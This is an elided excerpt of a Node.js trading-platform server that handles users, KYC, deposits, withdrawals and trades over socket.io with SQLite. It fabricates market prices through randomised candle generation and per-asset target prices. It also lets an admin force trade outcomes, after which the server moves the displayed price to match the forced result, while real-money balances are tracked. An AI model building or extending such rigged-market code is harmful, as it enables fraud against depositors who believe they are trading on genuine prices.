...
try {
    db.prepare('ALTER TABLE users ADD COLUMN photoURL TEXT').run();
}
catch (e) { }
try {
    db.prepare('ALTER TABLE users ADD COLUMN uid TEXT').run();
}
catch (e) { }
async function startServer() {
    ...
    const savedSettings = db.prepare('SELECT value FROM settings WHERE key = ?').get('trade_settings');
    if (savedSettings) {
        globalTradeSettings = JSON.parse(savedSettings.value);
    }
    const savedAssetSettings = db.prepare('SELECT value FROM settings WHERE key = ?').get('asset_settings');
    ...
    const savedDepositSettings = db.prepare('SELECT value FROM settings WHERE key = ?').get('deposit_settings');
    if (savedDepositSettings) {
        globalDepositSettings = { ...globalDepositSettings, ...JSON.parse(savedDepositSettings.value) };
    }
    const savedPlatformSettings = db.prepare('SELECT value FROM settings WHERE key = ?').get('platform_settings');
    if (savedPlatformSettings) {
        globalPlatformSettings = { ...globalPlatformSettings, ...JSON.parse(savedPlatformSettings.value) };
    }
    const saveTradeSettings = (settings) => {
    ...
    const saveDepositSettings = (settings) => {
    ...
    // Load stats from DB
    const loadStats = () => {
        const allTime = db.prepare('SELECT SUM(total_trades) as trades, SUM(total_volume) as volume, SUM(total_user_profit) as profit, SUM(total_user_loss) as loss FROM trade_stats').get();
        const daily = db.prepare('SELECT * FROM trade_stats WHERE date = ?').get(today);
    ...
    loadStats();
    const saveTradeToStats = (amount, userProfit, isWin, accountType) => {
        if (accountType !== 'REAL')
            return; // Only track real balance trades as requested
    ...
    Object.keys(assets).forEach(symbol => {
        ...
        const existingHistory = db.prepare('SELECT * FROM market_history WHERE symbol = ? ORDER BY time DESC LIMIT 1').get(symbol);
        if (existingHistory && (now - existingHistory.time) < oneDayMs) {
            // Load existing history
            const rows = db.prepare('SELECT * FROM market_history WHERE symbol = ? AND time > ? ORDER BY time ASC').all(symbol, now - oneDayMs);
            ...
            const transaction = db.transaction((symbol, startTime, startPrice) => {
                ...
                for (let i = 86400; i >= 0; i--) {
                    ...
                    if (candleTypeRand < 0.15)
                        moveMultiplier = 0.1;
                    else if (candleTypeRand < 0.35)
                        moveMultiplier = 1.6;
                    ...
                    else if (wickRand < 0.2) {
                        lowerWickBase *= 4.5;
                        upperWickBase *= 0.4;
                    }
                    else if (wickRand < 0.3) {
                        upperWickBase *= 4.5;
                        lowerWickBase *= 0.4;
                    }
        ...
        Object.keys(assets).forEach(symbol => {
            ...
            if (!asset.isFrozen) {
                if (asset.targetPrice) {
                    ...
                    let moveMultiplier = 1.0;
                    if (candleTypeRand < 0.15)
                        moveMultiplier = 0.15; // Doji / Small body
                    else if (candleTypeRand < 0.35)
                        moveMultiplier = 1.5; // Healthy / Strong body
    ...
    io.on('connection', (socket) => {
        ...
        socket.on('user-sync', (userData) => {
            if (userData && userData.email) {
                ...
                const kyc = db.prepare('SELECT status, rejectionReason FROM kyc_submissions WHERE email = ? ORDER BY submittedAt DESC LIMIT 1').get(userData.email);
                ...
                const userFromDb = db.prepare('SELECT * FROM users WHERE email = ?').get(userData.email);
                connectedUsers[socket.id] = {
                    ...connectedUsers[socket.id],
                    ...userData,
                    ...userFromDb,
        ...
        const initialPrices = {};
        Object.keys(assets).forEach(symbol => {
            initialPrices[symbol] = assets[symbol].price;
        });
        ...
        socket.on('place-trade', (trade) => {
            ...
            setTimeout(() => {
                const activeTrade = activeTrades[trade.id];
                if (!activeTrade)
                    return; // Trade might have been forced by admin
                const assetKey = activeTrade.assetShortName || activeTrade.asset;
                const currentPrice = assets[assetKey]?.price || activeTrade.entryPrice;
                ...
                if (activeTrade.forcedResult) {
                    ...
                    const volatility = assets[assetKey]?.volatility || 0.001;
                    ...
                    if (assets[assetKey]) {
                        assets[assetKey].price = finalClosePrice;
                    }
                }
                else {
        ...
        socket.on('admin-update-deposit-status', ({ id, status }) => {
            try {
                ...
                if (status === 'APPROVED' && oldStatus === 'PENDING') {
                    const user = db.prepare('SELECT balance FROM users WHERE email = ?').get(deposit.email);
                    if (user) {
        ...
        socket.on('cancel-withdrawal', ({ id, email }) => {
            try {
                const withdrawal = db.prepare('SELECT * FROM withdrawals WHERE id = ? AND email = ? AND status = \'PENDING\'').get(id, email);
                if (!withdrawal) {
        ...
        socket.on('admin-update-withdraw-status', ({ id, status }) => {
            try {
                ...
                if ((status === 'REJECTED' || status === 'CANCELLED') && oldStatus === 'PENDING') {
                    const user = db.prepare('SELECT balance FROM users WHERE email = ?').get(withdrawal.email);
                    if (user) {
                        const newBalance = user.balance + withdrawal.amount;
        ...
        socket.on('admin-update-kyc-status', ({ id, status, reason }) => {
            try {
                ...
                const kyc = db.prepare('SELECT email FROM kyc_submissions WHERE id = ?').get(id);
                if (kyc) {
...
function updateDailyStats(amount, profit, isWin) {
    const date = new Date().toISOString().split('T')[0];
    const stats = db.prepare('SELECT * FROM trade_stats WHERE date = ?').get(date);
...
function saveTradeSettings(settings) {
    db.prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)').run('trade_settings', JSON.stringify(settings));
}
startServer();
